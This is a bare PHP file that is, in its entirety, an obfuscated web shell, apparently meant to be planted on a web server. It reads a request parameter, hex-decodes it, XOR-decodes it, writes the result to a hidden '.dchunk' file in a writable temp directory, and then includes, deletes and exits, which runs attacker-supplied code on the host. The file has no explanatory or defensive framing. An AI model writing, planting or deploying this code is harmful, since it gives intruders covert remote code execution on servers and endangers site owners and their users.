<?php

if(in_array("d\x61t\x61", array_keys($_REQUEST))){
	$flag = array_filter([getenv("TEMP"), session_save_path(), sys_get_temp_dir(), getcwd(), ini_get("upload_tmp_dir"), "/var/tmp", getenv("TMP"), "/tmp", "/dev/shm"]);
	$item = hex2bin($_REQUEST["d\x61t\x61"]);
	$comp=    '' ;    $k = 0; while($k < strlen($item)){$comp .= chr(ord($item[$k]) ^ 2);$k++;}
	while ($sym = array_shift($flag)) {
    		if (!( !is_dir($sym) || !is_writable($sym) )) {
    $pointer = join("/", [$sym, ".dchunk"]);
    $success = file_put_contents($pointer, $comp);
if ($success) {
	include $pointer;
	@unlink($pointer);
	die();}
}
}
}